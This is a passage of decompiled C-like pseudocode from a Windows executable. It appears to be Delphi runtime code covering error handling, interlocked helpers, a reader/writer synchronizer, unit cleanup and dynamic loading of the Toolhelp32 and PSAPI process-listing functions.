// 40A554: using guessed type int dword_40A554[3];
// 42C728: using guessed type int dword_42C728;
// 42C72C: using guessed type char byte_42C72C;
// 42C72D: using guessed type char byte_42C72D;
// 42C72E: using guessed type char byte_42C72E;
// 42C72F: using guessed type char byte_42C72F;
// 42C730: using guessed type char byte_42C730;
// 42C731: using guessed type char byte_42C731;
// 42C734: using guessed type _DWORD dword_42C734;
// 42C738: using guessed type _DWORD dword_42C738;
// 42C73C: using guessed type char byte_42C73C;
// 42C740: using guessed type _DWORD dword_42C740;
// 42C744: using guessed type _DWORD dword_42C744;
// 42C748: using guessed type _DWORD dword_42C748;
// 42C74C: using guessed type _DWORD dword_42C74C;
// 42C7F4: using guessed type int dword_42C7F4[];

//----- (0040A59C) --------------------------------------------------------
_DWORD *sub_40A59C()
{
  int LastError_0; // eax
  int v1; // ebx
  _DWORD *v2; // edx
  struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList; // [esp-Ch] [ebp-24h] BYREF
  void *v5; // [esp-8h] [ebp-20h]
  int *v6; // [esp-4h] [ebp-1Ch]
  void *v7; // [esp+0h] [ebp-18h]
  char *v8; // [esp+4h] [ebp-14h] BYREF
  int v9; // [esp+8h] [ebp-10h] BYREF
  char v10; // [esp+Ch] [ebp-Ch]
  char *v11; // [esp+10h] [ebp-8h]
  char v12; // [esp+14h] [ebp-4h]
  int savedregs; // [esp+18h] [ebp+0h] BYREF

  v8 = 0;
  v6 = &savedregs;
  v5 = &loc_40A62C;
  ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&ExceptionList);
  LastError_0 = GetLastError_0();
  v1 = LastError_0;
  if ( LastError_0 )
  {
    v9 = LastError_0;
    v10 = 0;
    sub_408D74(LastError_0, &v8);
    v11 = v8;
    v12 = 11;
    v2 = (_DWORD *)sub_409660((int)dword_4077C8, 1, off_42B9C8, 1, (int)&v9);
  }
  else
  {
    v2 = sub_409624((int)dword_4077C8, 1, off_42BA68[0]);
  }
  v2[3] = v1;
  sub_403CCC((int)v2, (int)ExceptionList, (int)v5, (int)v6, (int)v7);
  __writefsdword(0, (unsigned int)v5);
  v7 = &loc_40A633;
  return sub_40426C(&v8);
}
// 4077C8: using guessed type int dword_4077C8[3];
// 42B9C8: using guessed type int **off_42B9C8;
// 42BA68: using guessed type int **off_42BA68[4];

//----- (0040A638) --------------------------------------------------------
int __usercall sub_40A638@<eax>(int a1@<eax>)
{
  if ( !a1 )
    sub_40A59C();
  return a1;
}

//----- (0040A648) --------------------------------------------------------
int sub_40A648()
{
  int v0; // eax
  int result; // eax

  while ( dword_42B2AC )
  {
    v0 = (int)dword_42B2AC;
    dword_42B2AC = (_DWORD *)*dword_42B2AC;
    result = sub_402700(v0);
  }
  return result;
}
// 42B2AC: using guessed type _DWORD *dword_42B2AC;

//----- (0040A668) --------------------------------------------------------
HMODULE sub_40A668()
{
  HMODULE result; // eax

  result = GetModuleHandleA_1("kernel32.dll");
  if ( result )
  {
    result = (HMODULE)GetProcAddress_0(result, "GetDiskFreeSpaceExA");
    dword_42B0E4 = (int)result;
  }
  if ( !dword_42B0E4 )
  {
    result = (HMODULE)sub_40807C;
    dword_42B0E4 = (int)sub_40807C;
  }
  return result;
}
// 42B0E4: using guessed type int dword_42B0E4;

//----- (0040A6C4) --------------------------------------------------------
signed __int32 __usercall sub_40A6C4@<eax>(volatile signed __int32 *a1@<eax>)
{
  return _InterlockedIncrement(a1);
}

//----- (0040A6D0) --------------------------------------------------------
signed __int32 __usercall sub_40A6D0@<eax>(volatile signed __int32 *a1@<eax>)
{
  return _InterlockedDecrement(a1);
}

//----- (0040A6DC) --------------------------------------------------------
__int32 __usercall sub_40A6DC@<eax>(volatile __int32 *a1@<eax>, __int32 a2@<edx>)
{
  return _InterlockedExchange(a1, a2);
}

//----- (0040A6E4) --------------------------------------------------------
signed __int32 __usercall sub_40A6E4@<eax>(volatile signed __int32 *a1@<eax>, unsigned int a2@<edx>)
{
  return _InterlockedExchangeAdd(a1, a2);
}

//----- (0040A6EC) --------------------------------------------------------
_DWORD *__usercall sub_40A6EC@<eax>(_DWORD *a1@<eax>, char a2@<dl>)
{
  char v2; // bl
  _DWORD *v3; // esi
  char v5; // [esp-10h] [ebp-18h]

  if ( a2 )
    a1 = (_DWORD *)sub_403864((int)a1, a2, v5);
  v2 = a2;
  v3 = a1;
  sub_403504(a1, 0);
  v3[19] = 60000;
  if ( v2 )
    sub_4038BC(v3);
  return v3;
}
// 40A6F5: variable 'v5' is possibly undefined
// 40A6FA: variable 'a2' is possibly undefined

//----- (0040A728) --------------------------------------------------------
_DWORD *__usercall sub_40A728@<eax>(_DWORD *a1@<eax>, char a2@<dl>)
{
  _DWORD *v2; // eax
  char v3; // dl
  char v4; // bl
  _DWORD *v5; // edi
  int i; // esi
  _DWORD *v7; // ebp
  int v8; // eax
  int v9; // ebp
  int v10; // eax
  _DWORD *result; // eax

  v2 = sub_4038CC(a1, a2);
  v4 = v3;
  v5 = v2;
  for ( i = 0; i != 16; ++i )
  {
    v7 = (_DWORD *)v5[i + 1];
    v5[i + 1] = 0;
    while ( v7 )
    {
      v8 = (int)v7;
      v7 = (_DWORD *)*v7;
      sub_402700(v8);
    }
  }
  v9 = v5[17];
  v5[17] = 0;
  while ( v9 )
  {
    v10 = v9;
    v9 = *(_DWORD *)(v9 + 4);
    sub_402700(v10);
  }
  result = sub_403524(v5, v4 & 0xFC);
  if ( v4 > 0 )
    return (_DWORD *)sub_4038B4(v5);
  return result;
}
// 40A731: variable 'v3' is possibly undefined

//----- (0040A790) --------------------------------------------------------
char sub_40A790()
{
  __int16 CurrentThreadId_0; // [esp+0h] [ebp-2h]

  CurrentThreadId_0 = GetCurrentThreadId_0();
  return (HIBYTE(CurrentThreadId_0) ^ CurrentThreadId_0) & 0xF;
}

//----- (0040A7A8) --------------------------------------------------------
_DWORD *__usercall sub_40A7A8@<eax>(__int32 a1@<eax>, _DWORD *a2@<edx>)
{
  unsigned __int8 v3; // bl
  _DWORD *v4; // ebp
  DWORD CurrentThreadId_0; // eax
  DWORD v6; // esi
  _DWORD *result; // eax

  sub_40A6C4((volatile signed __int32 *)(a1 + 72));
  v3 = sub_40A790();
  v4 = *(_DWORD **)(a1 + 4 * v3 + 4);
  CurrentThreadId_0 = GetCurrentThreadId_0();
  v6 = CurrentThreadId_0;
  while ( v4 && CurrentThreadId_0 != v4[2] )
    v4 = (_DWORD *)*v4;
  if ( !v4 )
  {
    v4 = (_DWORD *)sub_40A91C(a1);
    if ( !v4 )
      v4 = sub_4079FC(16);
    v4[2] = v6;
    *v4 = v4;
    *v4 = sub_40A6DC((volatile __int32 *)(a1 + 4 * v3 + 4), (__int32)v4);
  }
  result = a2;
  *a2 = v4;
  return result;
}

//----- (0040A820) --------------------------------------------------------
_DWORD *__usercall sub_40A820@<eax>(__int32 a1@<eax>, _DWORD *a2@<edx>)
{
  __int32 v3; // ebx
  __int32 *v4; // ebp
  DWORD TickCount; // edi
  int v6; // eax
  _DWORD *result; // eax
  __int32 v9; // [esp+4h] [ebp-14h] BYREF

  v9 = sub_40A6DC((volatile __int32 *)(a1 + 68), 0);
  if ( !sub_40A6D0((volatile signed __int32 *)(a1 + 72)) )
  {
    v3 = v9;
    v4 = &v9;
    TickCount = GetTickCount();
    if ( v3 )
    {
      while ( 1 )
      {
        v6 = v3;
        v3 = *(_DWORD *)(v3 + 4);
        if ( *(_DWORD *)(v6 + 8) )
          break;
        if ( TickCount >= *(_DWORD *)(v6 + 12) && TickCount - *(_DWORD *)(v6 + 12) <= *(_DWORD *)(a1 + 76) )
          goto LABEL_8;
        sub_402700(v6);
        *v4 = v3;
LABEL_9:
        if ( !v3 )
          goto LABEL_10;
      }
      *(_DWORD *)(v6 + 8) = 0;
      *(_DWORD *)(v6 + 12) = TickCount;
LABEL_8:
      v4 = (__int32 *)(v6 + 4);
      goto LABEL_9;
    }
  }
LABEL_10:
  sub_40A8F0(a1, v9);
  result = a2;
  *a2 = 0;
  return result;
}

//----- (0040A8A8) --------------------------------------------------------
__int32 __usercall sub_40A8A8@<eax>(int a1@<eax>, __int32 **a2@<edx>)
{
  volatile __int32 *i; // eax
  __int32 result; // eax

  for ( i = (volatile __int32 *)(a1 + 4 * (unsigned __int8)sub_40A790() + 4);
        *i && *(__int32 **)i != *a2;
        i = (volatile __int32 *)*i )
  {
    ;
  }
  sub_40A6DC(i, **a2);
  (*a2)[1] = (__int32)*a2;
  result = sub_40A6DC((volatile __int32 *)(a1 + 68), (__int32)*a2);
  (*a2)[1] = result;
  return result;
}

//----- (0040A8F0) --------------------------------------------------------
__int32 __usercall sub_40A8F0@<eax>(__int32 result@<eax>, __int32 a2@<edx>)
{
  __int32 i; // ebx

  if ( a2 )
  {
    for ( i = a2; *(_DWORD *)(i + 4); i = *(_DWORD *)(i + 4) )
      ;
    *(_DWORD *)(i + 4) = a2;
    result = sub_40A6DC((volatile __int32 *)(result + 68), a2);
    *(_DWORD *)(i + 4) = result;
  }
  return result;
}

//----- (0040A91C) --------------------------------------------------------
__int32 __usercall sub_40A91C@<eax>(__int32 a1@<eax>)
{
  __int32 v2; // eax
  __int32 v3; // esi
  __int32 i; // ebx

  v2 = sub_40A6DC((volatile __int32 *)(a1 + 68), 0);
  v3 = v2;
  for ( i = v2; i && *(_DWORD *)(i + 8); i = *(_DWORD *)(i + 4) )
    v2 = i;
  if ( i )
  {
    if ( v3 == i )
      v3 = *(_DWORD *)(i + 4);
    else
      *(_DWORD *)(v2 + 4) = *(_DWORD *)(i + 4);
    sub_402E48((char *)i, 16, 0);
  }
  sub_40A8F0(a1, v3);
  return i;
}

//----- (0040A974) --------------------------------------------------------
_DWORD *__usercall sub_40A974@<eax>(_DWORD *a1@<eax>, char a2@<dl>)
{
  char v2; // bl
  _DWORD *v3; // esi
  char v5; // [esp-10h] [ebp-18h]

  if ( a2 )
    a1 = (_DWORD *)sub_403864((int)a1, a2, v5);
  v2 = a2;
  v3 = a1;
  sub_403504(a1, 0);
  v3[3] = 0xFFFF;
  v3[4] = CreateEventA(0, -1, -1, 0);
  v3[5] = CreateEventA(0, 0, 0, 0);
  v3[6] = -1;
  v3[8] = sub_40A6EC(dword_4078D4, 1);
  if ( v2 )
    sub_4038BC(v3);
  return v3;
}
// 40A97D: variable 'v5' is possibly undefined
// 40A982: variable 'a2' is possibly undefined
// 4078D4: using guessed type int dword_4078D4[21];

//----- (0040A9E8) --------------------------------------------------------
_DWORD *__usercall sub_40A9E8@<eax>(_DWORD *a1@<eax>, char a2@<dl>)
{
  _DWORD *v2; // eax
  int v3; // edx
  char v4; // bl
  _DWORD *v5; // esi
  _DWORD *result; // eax

  v2 = sub_4038CC(a1, a2);
  v4 = v3;
  v5 = v2;
  sub_40AA74((int)v2, v3);
  sub_403524(v5, v4 & 0xFC);
  CloseHandle_0((HANDLE)v5[4]);
  CloseHandle_0((HANDLE)v5[5]);
  result = sub_403534((_DWORD *)v5[8]);
  if ( v4 > 0 )
    return (_DWORD *)sub_4038B4(v5);
  return result;
}
// 40A9EF: variable 'v3' is possibly undefined

//----- (0040AA30) --------------------------------------------------------
BOOL __usercall sub_40AA30@<eax>(int a1@<eax>)
{
  return ResetEvent(*(HANDLE *)(a1 + 16));
}

//----- (0040AA3C) --------------------------------------------------------
BOOL __usercall sub_40AA3C@<eax>(int a1@<eax>)
{
  return SetEvent(*(HANDLE *)(a1 + 16));
}

//----- (0040AA48) --------------------------------------------------------
BOOL __usercall sub_40AA48@<eax>(int a1@<eax>)
{
  return SetEvent(*(HANDLE *)(a1 + 20));
}

//----- (0040AA54) --------------------------------------------------------
DWORD __usercall sub_40AA54@<eax>(int a1@<eax>)
{
  return WaitForSingleObject(*(HANDLE *)(a1 + 16), *(_DWORD *)(a1 + 24));
}

//----- (0040AA64) --------------------------------------------------------
DWORD __usercall sub_40AA64@<eax>(int a1@<eax>)
{
  return WaitForSingleObject(*(HANDLE *)(a1 + 20), *(_DWORD *)(a1 + 24));
}

//----- (0040AA74) --------------------------------------------------------
int __usercall sub_40AA74@<eax>(int a1@<eax>, int a2@<ebx>)
{
  signed __int32 v2; // eax
  unsigned int v4[2]; // [esp-Ch] [ebp-24h] BYREF
  int *v5; // [esp-4h] [ebp-1Ch]
  int v6; // [esp+4h] [ebp-14h]
  DWORD CurrentThreadId_0; // [esp+8h] [ebp-10h]
  bool v8; // [esp+Fh] [ebp-9h]
  int v9; // [esp+10h] [ebp-8h] BYREF
  int v10; // [esp+14h] [ebp-4h]
  int savedregs; // [esp+18h] [ebp+0h] BYREF

  v10 = a1;
  LOBYTE(a2) = 1;
  CurrentThreadId_0 = GetCurrentThreadId_0();
  if ( *(_DWORD *)(v10 + 36) != CurrentThreadId_0 )
  {
    sub_40AA30(v10);
    v6 = *(_DWORD *)(v10 + 40);
    sub_40A7A8(*(_DWORD *)(v10 + 32), &v9);
    v5 = &savedregs;
    v4[1] = (unsigned int)&loc_40AAFC;
    v4[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
    __writefsdword(0, (unsigned int)v4);
    v8 = *(_DWORD *)(v9 + 12) != 0;
    if ( v8 )
      sub_40A6C4((volatile signed __int32 *)(v10 + 12));
    __writefsdword(0, v4[0]);
    v5 = (int *)&loc_40AB24;
    sub_40A820(*(_DWORD *)(v10 + 32), &v9);
    while ( sub_40A6E4((volatile signed __int32 *)(v10 + 12), 0xFFFF0001) != 0xFFFF )
    {
      if ( sub_40A6E4((volatile signed __int32 *)(v10 + 12), 0xFFFFu) + 0xFFFF > 0 )
        sub_40AA64(v10);
    }
    if ( v8 )
      sub_40A6D0((volatile signed __int32 *)(v10 + 12));
    *(_DWORD *)(v10 + 36) = CurrentThreadId_0;
    v2 = sub_40A6C4((volatile signed __int32 *)(v10 + 40));
    LOBYTE(a2) = v2 - 1 == v6;
  }
  ++*(_DWORD *)(v10 + 28);
  return a2;
}

//----- (0040AB74) --------------------------------------------------------
_DWORD *__usercall sub_40AB74@<eax>(int a1@<eax>)
{
  unsigned int v2[2]; // [esp-Ch] [ebp-14h] BYREF
  int *v3; // [esp-4h] [ebp-Ch]
  __int32 *v4; // [esp+0h] [ebp-8h] BYREF
  int v5; // [esp+4h] [ebp-4h]
  int savedregs; // [esp+8h] [ebp+0h] BYREF

  v5 = a1;
  sub_40A7A8(*(_DWORD *)(a1 + 32), &v4);
  v3 = &savedregs;
  v2[1] = (unsigned int)&loc_40AC0A;
  v2[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v2);
  if ( !--*(_DWORD *)(v5 + 28) )
  {
    *(_DWORD *)(v5 + 36) = 0;
    sub_40A6E4((volatile signed __int32 *)(v5 + 12), 0xFFFFu);
    sub_40AA48(v5);
    Sleep_0(0);
    sub_40AA3C(v5);
  }
  if ( !v4[3] )
    sub_40A8A8(*(_DWORD *)(v5 + 32), &v4);
  __writefsdword(0, v2[0]);
  v3 = (int *)&loc_40AC11;
  return sub_40A820(*(_DWORD *)(v5 + 32), &v4);
}

//----- (0040AC18) --------------------------------------------------------
_DWORD *__usercall sub_40AC18@<eax>(int a1@<eax>)
{
  char v1; // bl
  unsigned int v3[2]; // [esp-Ch] [ebp-18h] BYREF
  int *v4; // [esp-4h] [ebp-10h]
  int v5; // [esp+4h] [ebp-8h] BYREF
  int v6; // [esp+8h] [ebp-4h]
  int savedregs; // [esp+Ch] [ebp+0h] BYREF

  v6 = a1;
  v1 = 0;
  if ( GetCurrentThreadId_0() != *(_DWORD *)(a1 + 36) )
  {
    while ( sub_40A6D0((volatile signed __int32 *)(v6 + 12)) <= 0 )
    {
      sub_40A6C4((volatile signed __int32 *)(v6 + 12));
      sub_40AA54(v6);
    }
    v1 = 1;
  }
  sub_40A7A8(*(_DWORD *)(v6 + 32), &v5);
  v4 = &savedregs;
  v3[1] = (unsigned int)&loc_40ACAE;
  v3[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v3);
  if ( ((unsigned __int8)v1 & (++*(_DWORD *)(v5 + 12) > 1u)) != 0 )
    sub_40A6C4((volatile signed __int32 *)(v6 + 12));
  __writefsdword(0, v3[0]);
  v4 = (int *)&loc_40ACB5;
  return sub_40A820(*(_DWORD *)(v6 + 32), &v5);
}

//----- (0040ACBC) --------------------------------------------------------
_DWORD *__usercall sub_40ACBC@<eax>(int a1@<eax>)
{
  unsigned int v2[2]; // [esp-Ch] [ebp-14h] BYREF
  int *v3; // [esp-4h] [ebp-Ch]
  __int32 *v4; // [esp+0h] [ebp-8h] BYREF
  int v5; // [esp+4h] [ebp-4h]
  int savedregs; // [esp+8h] [ebp+0h] BYREF

  v5 = a1;
  sub_40A7A8(*(_DWORD *)(a1 + 32), &v4);
  v3 = &savedregs;
  v2[1] = (unsigned int)&loc_40AD41;
  v2[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v2);
  if ( !--v4[3] )
  {
    sub_40A8A8(*(_DWORD *)(v5 + 32), &v4);
    if ( GetCurrentThreadId_0() != *(_DWORD *)(v5 + 36) && sub_40A6C4((volatile signed __int32 *)(v5 + 12)) == 0xFFFF )
      sub_40AA48(v5);
  }
  __writefsdword(0, v2[0]);
  v3 = (int *)&loc_40AD48;
  return sub_40A820(*(_DWORD *)(v5 + 32), &v4);
}

//----- (0040AD4C) --------------------------------------------------------
_DWORD *__usercall sub_40AD4C@<eax>(_DWORD **a1@<eax>)
{
  _DWORD *v1; // edx

  v1 = *a1;
  *a1 = 0;
  return sub_403534(v1);
}

//----- (0040AD5C) --------------------------------------------------------
BOOL __usercall sub_40AD5C@<eax>(int (__stdcall ***a1)(_DWORD, int, int)@<eax>, int a2@<edx>, int a3@<ecx>)
{
  return a1 && !(**a1)(a1, a2, a3);
}

//----- (0040AD80) --------------------------------------------------------
_DWORD *__usercall sub_40AD80@<eax>(int *a1@<eax>, _DWORD *a2@<edx>, _DWORD *a3@<ecx>)
{
  _DWORD *v6; // eax
  _DWORD *v7; // eax
  _DWORD *v8; // ebx
  unsigned int v10[2]; // [esp-18h] [ebp-1Ch] BYREF
  int *v11; // [esp-10h] [ebp-14h]
  int (__stdcall ***v12)(_DWORD, int, int); // [esp+0h] [ebp-4h] BYREF
  int savedregs; // [esp+4h] [ebp+0h] BYREF

  v12 = 0;
  v11 = &savedregs;
  v10[1] = (unsigned int)&loc_40ADF7;
  v10[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v10);
  if ( a1
    && ((v6 = sub_405F40(&v12), (unsigned __int8)sub_4035E8(a1, dword_40AE08, v6))
     && (v7 = (_DWORD *)sub_40AD5C(v12, (int)a2, (int)a3), (_BYTE)v7)
     || (v7 = sub_4035E8(a1, a2, a3), (_BYTE)v7)) )
  {
    LOBYTE(v7) = 1;
  }
  else
  {
    v7 = 0;
  }
  v8 = v7;
  __writefsdword(0, v10[0]);
  v11 = (int *)&loc_40ADFE;
  sub_405F40(&v12);
  return v8;
}
// 40AE08: using guessed type int dword_40AE08[2];

//----- (0040B0E8) --------------------------------------------------------
int sub_40B0E8()
{
  int result; // eax
  unsigned int v1[3]; // [esp-Ch] [ebp-Ch] BYREF
  int savedregs; // [esp+0h] [ebp+0h] BYREF

  v1[2] = (unsigned int)&savedregs;
  v1[1] = (unsigned int)&loc_40B25D;
  v1[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v1);
  if ( !++dword_42C838 )
  {
    sub_40AD4C(&dword_42C844);
    sub_40A648();
    sub_409CA8();
    sub_404CE4((int *)&off_42B1F8, (char *)dword_409784, 22);
    sub_404CE4(&dword_42B1C0, (char *)dword_409704, 7);
    sub_404CE4((int *)&off_42B0E8, (char *)dword_40105C, 2);
    sub_40426C(&off_42B0E0);
    sub_405868(&dword_42C834, (int)dword_40785C);
    sub_405868(&dword_42C830, (int)dword_407838);
    sub_404CE4(dword_42C7F8, (char *)dword_40105C, 7);
    sub_404CE4(dword_42C7CC, (char *)dword_40105C, 7);
    sub_404CE4(dword_42C7B0, (char *)dword_40105C, 7);
    sub_404CE4(dword_42C780, (char *)dword_40105C, 12);
    sub_404CE4(dword_42C750, (char *)dword_40105C, 12);
    sub_40426C(&dword_42C74C);
    sub_40426C(&dword_42C748);
    sub_40426C(&dword_42C744);
    sub_40426C(&dword_42C740);
    sub_40426C(&dword_42C738);
    sub_40426C(&dword_42C734);
    sub_40426C(&dword_42C728);
    sub_40426C(&dword_42B0BC);
    sub_404900(&dword_42B0A8);
    sub_40426C(&dword_42B0A4);
  }
  result = 0;
  __writefsdword(0, v1[0]);
  return result;
}
// 40105C: using guessed type int dword_40105C[2];
// 407838: using guessed type int dword_407838[2];
// 40785C: using guessed type int dword_40785C[2];
// 409704: using guessed type int dword_409704[4];
// 409784: using guessed type int dword_409784[5];
// 42B0A4: using guessed type _DWORD dword_42B0A4;
// 42B0A8: using guessed type OLECHAR *dword_42B0A8;
// 42B0BC: using guessed type _DWORD dword_42B0BC;
// 42B0E0: using guessed type int *off_42B0E0;
// 42B0E8: using guessed type int (*off_42B0E8)[4];
// 42B1C0: using guessed type int dword_42B1C0;
// 42B1F8: using guessed type int (*off_42B1F8)[3];
// 42C728: using guessed type int dword_42C728;
// 42C734: using guessed type _DWORD dword_42C734;
// 42C738: using guessed type _DWORD dword_42C738;
// 42C740: using guessed type _DWORD dword_42C740;
// 42C744: using guessed type _DWORD dword_42C744;
// 42C748: using guessed type _DWORD dword_42C748;
// 42C74C: using guessed type _DWORD dword_42C74C;
// 42C750: using guessed type int dword_42C750[12];
// 42C780: using guessed type int dword_42C780[12];
// 42C7B0: using guessed type int dword_42C7B0[7];
// 42C7CC: using guessed type int dword_42C7CC[7];
// 42C7F8: using guessed type int dword_42C7F8[6];
// 42C830: using guessed type int dword_42C830;
// 42C834: using guessed type int dword_42C834;
// 42C838: using guessed type int dword_42C838;
// 42C844: using guessed type _DWORD *dword_42C844;

//----- (0040B268) --------------------------------------------------------
int __usercall sub_40B268@<eax>(int a1@<ebx>, int a2@<edi>, int a3@<esi>)
{
  int result; // eax
  unsigned int v5[3]; // [esp-Ch] [ebp-Ch] BYREF
  int savedregs; // [esp+0h] [ebp+0h] BYREF

  v5[2] = (unsigned int)&savedregs;
  v5[1] = (unsigned int)&loc_40B2D0;
  v5[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v5);
  if ( dword_42C838-- == 0 )
  {
    sub_404018(&dword_40AE18);
    sub_404040(&dword_40AF04);
    if ( byte_42C705 )
      sub_4042C0((volatile __int32 *)&off_42B0E0, (__int32)&dword_40B2E4);
    sub_409C24();
    sub_409D14();
    sub_40A668();
    sub_40A21C(a1, a2, a3);
  }
  result = 0;
  __writefsdword(0, v5[0]);
  return result;
}
// 40AE18: using guessed type int dword_40AE18;
// 40AF04: using guessed type int dword_40AF04;
// 40B2E4: using guessed type int dword_40B2E4;
// 42B0E0: using guessed type int *off_42B0E0;
// 42C705: using guessed type char byte_42C705;
// 42C838: using guessed type int dword_42C838;

//----- (0040B2E8) --------------------------------------------------------
bool sub_40B2E8()
{
  if ( !dword_42C84C )
  {
    dword_42C84C = GetModuleHandleA_1("kernel32.dll");
    if ( dword_42C84C )
    {
      dword_42C850 = (int)GetProcAddress_0(dword_42C84C, "CreateToolhelp32Snapshot");
      dword_42C854 = (int)GetProcAddress_0(dword_42C84C, "Heap32ListFirst");
      dword_42C858 = (int)GetProcAddress_0(dword_42C84C, "Heap32ListNext");
      dword_42C85C = (int)GetProcAddress_0(dword_42C84C, "Heap32First");
      dword_42C860 = (int)GetProcAddress_0(dword_42C84C, "Heap32Next");
      dword_42C864 = (int)GetProcAddress_0(dword_42C84C, "Toolhelp32ReadProcessMemory");
      dword_42C868 = (int)GetProcAddress_0(dword_42C84C, "Process32First");
      dword_42C86C = (int)GetProcAddress_0(dword_42C84C, "Process32Next");
      dword_42C870 = (int)GetProcAddress_0(dword_42C84C, "Process32FirstW");
      dword_42C874 = (int)GetProcAddress_0(dword_42C84C, "Process32NextW");
      dword_42C878 = (int)GetProcAddress_0(dword_42C84C, "Thread32First");
      dword_42C87C = (int)GetProcAddress_0(dword_42C84C, "Thread32Next");
      dword_42C880 = (int)GetProcAddress_0(dword_42C84C, "Module32First");
      dword_42C884 = (int)GetProcAddress_0(dword_42C84C, "Module32Next");
      dword_42C888 = (int)GetProcAddress_0(dword_42C84C, "Module32FirstW");
      dword_42C88C = (int)GetProcAddress_0(dword_42C84C, "Module32NextW");
    }
  }
  return dword_42C84C && dword_42C850;
}
// 42C84C: using guessed type HMODULE dword_42C84C;
// 42C850: using guessed type int dword_42C850;
// 42C854: using guessed type int dword_42C854;
// 42C858: using guessed type int dword_42C858;
// 42C85C: using guessed type int dword_42C85C;
// 42C860: using guessed type int dword_42C860;
// 42C864: using guessed type int dword_42C864;
// 42C868: using guessed type int dword_42C868;
// 42C86C: using guessed type int dword_42C86C;
// 42C870: using guessed type int dword_42C870;
// 42C874: using guessed type int dword_42C874;
// 42C878: using guessed type int dword_42C878;
// 42C87C: using guessed type int dword_42C87C;
// 42C880: using guessed type int dword_42C880;
// 42C884: using guessed type int dword_42C884;
// 42C888: using guessed type int dword_42C888;
// 42C88C: using guessed type int dword_42C88C;

//----- (0040B564) --------------------------------------------------------
int __usercall sub_40B564@<eax>(int a1@<eax>, int a2@<edx>)
{
  if ( sub_40B2E8() )
    return dword_42C850(a1, a2);
  else
    return 0;
}
// 42C850: invalid function type '?' has been ignored
// 42C850: using guessed type int (__stdcall *dword_42C850)(_DWORD, _DWORD);

//----- (0040B584) --------------------------------------------------------
int __usercall sub_40B584@<eax>(int a1@<eax>, int a2@<edx>)
{
  if ( sub_40B2E8() )
    return dword_42C868(a1, a2);
  else
    return 0;
}
// 42C868: invalid function type '?' has been ignored
// 42C868: using guessed type int (__stdcall *dword_42C868)(_DWORD, _DWORD);

//----- (0040B5A4) --------------------------------------------------------
int __usercall sub_40B5A4@<eax>(int a1@<eax>, int a2@<edx>)
{
  if ( sub_40B2E8() )
    return dword_42C86C(a1, a2);
  else
    return 0;
}
// 42C86C: invalid function type '?' has been ignored
// 42C86C: using guessed type int (__stdcall *dword_42C86C)(_DWORD, _DWORD);

//----- (0040B5C4) --------------------------------------------------------
int sub_40B5C4()
{
  int result; // eax
  unsigned int v1[3]; // [esp-Ch] [ebp-Ch] BYREF
  int savedregs; // [esp+0h] [ebp+0h] BYREF

  v1[2] = (unsigned int)&savedregs;
  v1[1] = (unsigned int)&loc_40B5E9;
  v1[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v1);
  ++dword_42C848;
  result = 0;
  __writefsdword(0, v1[0]);
  return result;
}
// 42C848: using guessed type int dword_42C848;

//----- (0040B5F4) --------------------------------------------------------
void sub_40B5F4()
{
  --dword_42C848;
}
// 42C848: using guessed type int dword_42C848;

//----- (0040B5FC) --------------------------------------------------------
char sub_40B5FC()
{
  if ( !dword_42C894 )
  {
    dword_42C894 = LoadLibraryA("PSAPI.dll");
    if ( (unsigned int)dword_42C894 < 0x20 )
    {
      dword_42C894 = 0;
      return 0;
    }
    dword_42C898 = (int)GetProcAddress_0(dword_42C894, "EnumProcesses");
    dword_42C89C = (int)GetProcAddress_0(dword_42C894, "EnumProcessModules");
    dword_42C8A0 = (int)GetProcAddress_0(dword_42C894, "GetModuleBaseNameA");
    dword_42C8A4 = (int)GetProcAddress_0(dword_42C894, "GetModuleFileNameExA");
    dword_42C8A8 = (int)GetProcAddress_0(dword_42C894, "GetModuleBaseNameA");
    dword_42C8AC = (int)GetProcAddress_0(dword_42C894, "GetModuleFileNameExA");
    dword_42C8B0 = (int)GetProcAddress_0(dword_42C894, "GetModuleBaseNameW");
    dword_42C8B4 = (int)GetProcAddress_0(dword_42C894, "GetModuleFileNameExW");
    dword_42C8B8 = (int)GetProcAddress_0(dword_42C894, "GetModuleInformation");
    dword_42C8BC = (int)GetProcAddress_0(dword_42C894, "EmptyWorkingSet");
    dword_42C8C0 = (int)GetProcAddress_0(dword_42C894, "QueryWorkingSet");
    dword_42C8C4 = (int)GetProcAddress_0(dword_42C894, "InitializeProcessForWsWatch");
    dword_42C8C8 = (int)GetProcAddress_0(dword_42C894, "GetMappedFileNameA");
    dword_42C8CC = (int)GetProcAddress_0(dword_42C894, "GetDeviceDriverBaseNameA");
    dword_42C8D0 = (int)GetProcAddress_0(dword_42C894, "GetDeviceDriverFileNameA");
    dword_42C8D4 = (int)GetProcAddress_0(dword_42C894, "GetMappedFileNameA");
    dword_42C8D8 = (int)GetProcAddress_0(dword_42C894, "GetDeviceDriverBaseNameA");
    dword_42C8DC = (int)GetProcAddress_0(dword_42C894, "GetDeviceDriverFileNameA");
    dword_42C8E0 = (int)GetProcAddress_0(dword_42C894, "GetMappedFileNameW");
    dword_42C8E4 = (int)GetProcAddress_0(dword_42C894, "GetDeviceDriverBaseNameW");
    dword_42C8E8 = (int)GetProcAddress_0(dword_42C894, "GetDeviceDriverFileNameW");
    dword_42C8EC = (int)GetProcAddress_0(dword_42C894, "EnumDeviceDrivers");
    dword_42C8F0 = (int)GetProcAddress_0(dword_42C894, "GetProcessMemoryInfo");
  }
  return 1;
}
// 42C894: using guessed type HMODULE dword_42C894;
// 42C898: using guessed type int dword_42C898;
// 42C89C: using guessed type int dword_42C89C;
// 42C8A0: using guessed type int dword_42C8A0;
// 42C8A4: using guessed type int dword_42C8A4;
// 42C8A8: using guessed type int dword_42C8A8;
// 42C8AC: using guessed type int dword_42C8AC;
// 42C8B0: using guessed type int dword_42C8B0;
